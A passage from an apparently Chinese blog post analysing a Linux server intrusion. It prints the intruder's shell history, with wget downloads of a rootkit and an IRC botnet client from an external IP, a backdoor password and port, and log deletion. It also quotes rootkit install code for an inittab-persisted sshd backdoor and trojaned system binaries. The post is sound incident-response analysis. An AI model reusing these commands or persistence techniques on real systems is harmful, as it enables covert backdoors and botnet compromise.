class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.ssh&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.lesshst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;.viminfo&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;.bash_history&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.profile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.vimrc&nbsp;</span></li></ol></pre>




<p></p>




<p>很不幸的发现,&rdquo;ls&rdquo;又出问题了.同样,用&rdquo;alias&rdquo;命令：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;alias&nbsp;ls&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;alias&nbsp;<span class="attribute">ls</span><span>=</span><span class="attribute-value">'ls&nbsp;-sa&nbsp;--color=auto'</span><span>&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;unalias&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;</span></li></ol></pre>




<p></p>




<p>这个时候,我才意识到问题的严重性.&rdquo;ls&rdquo;奇怪的举动和&rdquo;/var/log/&rdquo;大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的&rdquo;.bash_history&rdquo;时,就已经可以确定被入侵了。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;cat&nbsp;-n&nbsp;.bash_history&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;340&nbsp;&nbsp;w&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;341&nbsp;&nbsp;cd&nbsp;/var&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;342&nbsp;&nbsp;wget&nbsp;http://83.19.148.250/~matys/pliki/shv5.tar.gz&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;343&nbsp;&nbsp;tar&nbsp;-zxf&nbsp;shv5.tar.gz&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;344&nbsp;&nbsp;rm&nbsp;-rf&nbsp;shv5.tar.gz&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;345&nbsp;&nbsp;mv&nbsp;shv5&nbsp;.x&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;346&nbsp;&nbsp;cd&nbsp;.x&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;347&nbsp;&nbsp;./setup&nbsp;zibi.joe.149&nbsp;54098&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;348&nbsp;&nbsp;passwd&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;349&nbsp;&nbsp;passwd&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;350&nbsp;&nbsp;ps&nbsp;aux&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;351&nbsp;&nbsp;crontab&nbsp;-l&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;352&nbsp;&nbsp;cat&nbsp;/etc/issue&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;353&nbsp;&nbsp;cat&nbsp;/etc/passwd&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;354&nbsp;&nbsp;w&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;355&nbsp;&nbsp;who&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;356&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;357&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;358&nbsp;&nbsp;hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;359&nbsp;&nbsp;chmod&nbsp;+x&nbsp;hide&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;360&nbsp;&nbsp;hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;361&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;362&nbsp;&nbsp;cd&nbsp;/var/.x&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;363&nbsp;&nbsp;mkdir&nbsp;psotnic&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;364&nbsp;&nbsp;cd&nbsp;psotnic&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;365&nbsp;&nbsp;wget&nbsp;http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;366&nbsp;&nbsp;tar&nbsp;-zxf&nbsp;psotnic0.2.5.tar.gz&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;367&nbsp;&nbsp;rm&nbsp;-rf&nbsp;psotnic0.2.5.tar.gz&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;368&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;369&nbsp;&nbsp;mv&nbsp;psotnic-0.2.5-linux-static-ipv6&nbsp;synscan&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;370&nbsp;&nbsp;./synscan&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;371&nbsp;&nbsp;vi&nbsp;conf&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;372&nbsp;&nbsp;vi&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;373&nbsp;&nbsp;mv&nbsp;synscan&nbsp;smbd&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;374&nbsp;&nbsp;smbd&nbsp;-c&nbsp;conf&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;375&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;376&nbsp;&nbsp;ps&nbsp;aux&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;377&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;378&nbsp;&nbsp;./smbd&nbsp;-c&nbsp;conf&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;379&nbsp;&nbsp;./smbd&nbsp;-c&nbsp;conf1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;380&nbsp;&nbsp;./smbd&nbsp;conf&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;381&nbsp;&nbsp;./smbd&nbsp;conf1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;382&nbsp;&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;383&nbsp;&nbsp;rm&nbsp;-rf&nbsp;conf.dec&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;384&nbsp;&nbsp;rm&nbsp;-rf&nbsp;conf1.dec&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;385&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;386&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;387&nbsp;&nbsp;exit&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;425&nbsp;&nbsp;ssh&nbsp;ftp@62.101.251.166&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;426&nbsp;&nbsp;w&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;427&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;428&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;429&nbsp;&nbsp;cd&nbsp;/var/.x&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;430&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;431&nbsp;&nbsp;cd&nbsp;psotnic/&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;432&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;433&nbsp;&nbsp;rm&nbsp;-rf&nbsp;/var/log/*&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;434&nbsp;&nbsp;exit&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;435&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;436&nbsp;&nbsp;cd&nbsp;/var/.x/psotnic/&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;437&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;438&nbsp;&nbsp;vi&nbsp;conf2&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;439&nbsp;&nbsp;./smbd&nbsp;-c&nbsp;conf2&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;440&nbsp;&nbsp;./smbd&nbsp;conf2&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;441&nbsp;&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;conf2&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;442&nbsp;&nbsp;rm&nbsp;-rf&nbsp;conf2.dec&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;443&nbsp;&nbsp;cd&nbsp;..&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;444&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;445&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;446&nbsp;&nbsp;hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;447&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;448&nbsp;&nbsp;exit&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;449&nbsp;&nbsp;ps&nbsp;aux&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;450&nbsp;&nbsp;cd&nbsp;/var/.x&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;451&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;452&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;453&nbsp;&nbsp;cd&nbsp;psotnic/&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;454&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;455&nbsp;&nbsp;cat&nbsp;pid.MastaH&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;456&nbsp;&nbsp;kill&nbsp;-9&nbsp;2030&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;457&nbsp;&nbsp;./synscan&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;458&nbsp;&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;459&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;460&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li></ol></pre>




<p></p>




<p>这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除&rdquo;.bash_history&rdquo;文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵。</p>




<p>通过bash history我们得到了大量的信息.先来看一下&rdquo;/var/.x&rdquo;下面隐藏了什么和命令&rdquo;setup zibi.joe.149 54098&Prime;的作用吧。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x#&nbsp;file&nbsp;setup&nbsp;</span></span></li><li><span>&nbsp;&nbsp;setup:&nbsp;Bourne-Again&nbsp;shell&nbsp;script&nbsp;text&nbsp;executable&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;root@server1:/var/.x#&nbsp;wc&nbsp;-l&nbsp;setup&nbsp;</span></li><li><span>&nbsp;&nbsp;825&nbsp;setup&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;root@server1:/var/.x#&nbsp;head&nbsp;-17&nbsp;setup&nbsp;</span></li><li><span>&nbsp;&nbsp;#!/bin/bash&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;shv5-internal-release&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;by:&nbsp;PinT[x]&nbsp;April/2003&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;greetz&nbsp;to:&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;SH-members:&nbsp;BeSo_M,&nbsp;grass^,&nbsp;toolman,&nbsp;nobody,&nbsp;niceboy,&nbsp;armando99&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C00L|0,&nbsp;GolDenLord,&nbsp;Spike,&nbsp;zion&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;Alba-Hack&nbsp;:&nbsp;2Cool,&nbsp;heka,&nbsp;TheMind,&nbsp;ex-THG&nbsp;members&nbsp;...&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;SH-friends:&nbsp;mave,&nbsp;AlexTG,&nbsp;Cat|x,&nbsp;klex,&nbsp;JinkS&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;tC-members:&nbsp;eksol,&nbsp;termid,&nbsp;hex,&nbsp;keyhook,&nbsp;maher,&nbsp;tripod&nbsp;etc..&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;And&nbsp;all&nbsp;others&nbsp;who&nbsp;diserve&nbsp;to&nbsp;be&nbsp;here&nbsp;but&nbsp;i&nbsp;forgot&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;them&nbsp;at&nbsp;the&nbsp;moment&nbsp;!&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;PRIVATE&nbsp;!&nbsp;DO&nbsp;NOT&nbsp;DISTRIBUTE&nbsp;*censored*EZ&nbsp;!&nbsp;</span></li></ol></pre>




<p></p>




<p>&ldquo;setup&rdquo;这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门&ndash;&rdquo;/bin/ttyload&rdquo;,然后把它加到了&rdquo;/etc/inittab&rdquo;,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>mv&nbsp;$SSHDIR/sshd&nbsp;/sbin/ttyload&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;chmod&nbsp;a+xr&nbsp;/sbin/ttyload&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chmod&nbsp;o-w&nbsp;/sbin/ttyload&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;touch&nbsp;-acmr&nbsp;/bin/ls&nbsp;/sbin/ttyload&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;+isa&nbsp;/sbin/ttyload&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;kill&nbsp;-9&nbsp;`pidof&nbsp;ttyload`&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;....&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;#&nbsp;INITTAB&nbsp;SHUFFLING&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;-isa&nbsp;/etc/inittab&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;cat&nbsp;/etc/inittab&nbsp;|grep&nbsp;-v&nbsp;ttyload|grep&nbsp;-v&nbsp;getty&nbsp;<span class="tag">&gt;</span><span>&nbsp;/tmp/.init1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;cat&nbsp;/etc/inittab&nbsp;|grep&nbsp;getty&nbsp;<span class="tag">&gt;</span><span>&nbsp;/tmp/.init2&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;#&nbsp;Loading&nbsp;standard&nbsp;ttys&quot;&nbsp;<span class="tag">&gt;</span><span class="tag">&gt;</span><span>&nbsp;/tmp/.init1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;0:2345:once:/usr/sbin/ttyload&quot;&nbsp;<span class="tag">&gt;</span><span class="tag">&gt;</span><span>&nbsp;/tmp/.init1&nbsp;</span></span></li></ol></pre>




<p></p>




<p>它也替换了一些linux的标准命令。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>#&nbsp;Backdoor&nbsp;ps/top/du/ls/netstat/etc..&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;cd&nbsp;$BASEDIR/bin&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="attribute">BACKUP</span><span>=/usr/lib/libsh/.backup&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;mkdir&nbsp;$BACKUP&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;#&nbsp;ls&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;-isa&nbsp;/bin/ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;cp&nbsp;/bin/ls&nbsp;$BACKUP&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;mv&nbsp;-f&nbsp;ls&nbsp;/bin/ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;+isa&nbsp;/bin/ls&nbsp;</span></li></ol></pre>




<p></p>




<p>这样子就可以解释为什么&rdquo;ls&rdquo;命令输出那么奇怪了。</p>




<p>&ldquo;.backup&rdquo;文件夹保存了被替换之前的命令程序。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x#&nbsp;ls&nbsp;-l&nbsp;/usr/lib/libsh/.backup/&nbsp;</span></span></li><li><span>&nbsp;&nbsp;total&nbsp;552&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;126276&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;find&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;59012&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;ifconfig&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;77832&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;30388&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;md5sum&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;99456&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;netstat&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;65492&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;ps&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14016&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;pstree&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;50180&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;top&nbsp;</span></li></ol></pre>




<p></p>




<p>看了一下时间戳,居然是在圣诞节。</p>




<p>很显然,原始的&rdquo;ls&rdquo;和后门安装的&rdquo;ls&rdquo;是不一样的.他们的md5对比如下：</p>




<p></p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;md5sum&nbsp;/usr/lib/libsh/.backup/ls&nbsp;/bin/ls&nbsp;</span></span></li><li><span>eef7ca9dd6be1cc53bac84012f8d1675&nbsp;&nbsp;/usr/lib/libsh/.backup/ls&nbsp;</span></li><li class="alt"><span>0a07cf554c1a74ad974416f60916b78d&nbsp;&nbsp;/bin/ls&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>root@server1:~#&nbsp;file&nbsp;/bin/ls&nbsp;</span></li><li><span>/bin/ls:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;for&nbsp;GNU/Linux&nbsp;2.0.0,&nbsp;dynamically&nbsp;linked&nbsp;</span></li><li class="alt"><span>(uses&nbsp;shared&nbsp;libs),&nbsp;for&nbsp;GNU/Linux&nbsp;2.0.0,&nbsp;stripped&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>root@server1:~#&nbsp;file&nbsp;/usr/lib/libsh/.backup/ls&nbsp;</span></li><li><span>/usr/lib/libsh/.backup/ls:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.0,&nbsp;dynamically&nbsp;linked&nbsp;</span></li><li class="alt"><span>(uses&nbsp;shared&nbsp;libs),&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.0,&nbsp;stripped&nbsp;</span></li></ol></pre>




<p>这个rootkit(&ldquo;sh5.tar.gz&rdquo;)是从下面的地址下载的。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;83.19.148.250&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;4lo.bydg.pl.&nbsp;</span></li></ol></pre>




<p></p>




<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>




<p>这是运行&rdquo;setup&rdquo;命令的截图:(在服务器上的沙盒里运行的)</p>




<p style="text-align: center;"><a href="http://s9.51cto.com/wyfs01/M00/1E/85/wKioOVIyccTBL1IXAAFcnTvNkRs768.jpg" rel="lightbox[47824]" title="一次服务器被入侵后的分析"><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;&#8217; onmousewheel = &#8216;javascript:return big(this)&#8217; alt=&#8221;rq1&#8221; src=&#8221;http://s9.51cto.com/wyfs01/M00/1E/85/wKioOVIyccTBL1IXAAFcnTvNkRs768.jpg&#8221; /></a></p>




<p>所以&rdquo;zibi.joe.149&Prime;是后门的密码,&rdquo;54098&Prime;是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下：</p>




<p style="text-align: center;"><a href="http://s1.51cto.com/wyfs01/M00/1E/83/wKioJlIyccSjBaCDAAB0BmGLyBk455.jpg" rel="lightbox[47824]" title="一次服务器被入侵后的分析"><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;&#8217; onmousewheel = &#8216;javascript:return big(this)&#8217; alt=&#8221;rq2&#8221; src=&#8221;http://s1.51cto.com/wyfs01/M00/1E/83/wKioJlIyccSjBaCDAAB0BmGLyBk455.jpg&#8221; /></a></p>




<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.&rdquo;psotnic0.2.5.tar.gz&rdquo;就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为&rdquo;smbd&rdquo;,来达到隐藏的目的。</p>




<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了。</p>




<p></p>




<pre><ol class="dp-xml"><li class="alt"><span><span>vi&nbsp;conf&nbsp;</span></span></li><li><span>vi&nbsp;conf1&nbsp;</span></li><li class="alt"><span>....&nbsp;</span></li><li><span>./smbd&nbsp;-c&nbsp;conf&nbsp;</span></li><li class="alt"><span>./smbd&nbsp;-c&nbsp;conf1&nbsp;</span></li><li><span>./smbd&nbsp;conf&nbsp;</span></li><li class="alt"><span>./smbd&nbsp;conf1&nbsp;</span></li><li><span>./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li></ol></pre>




<p></p>




<p>让我们执行一下382这条命令,看看会发生什么。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;Psotnic&nbsp;C++&nbsp;edition,&nbsp;version&nbsp;0.2.5-ipv6&nbsp;(Jul&nbsp;17&nbsp;2005&nbsp;20:39:49)&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2003-2005&nbsp;Grzegorz&nbsp;Rusin&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Adding:&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Adding:&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf1&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Added&nbsp;2&nbsp;psotnics&nbsp;to&nbsp;cron&nbsp;</span></li></ol></pre>




<p></p>




<p>哇!它添加了cron定时任务.赶紧看一看：</p>




<p></p>




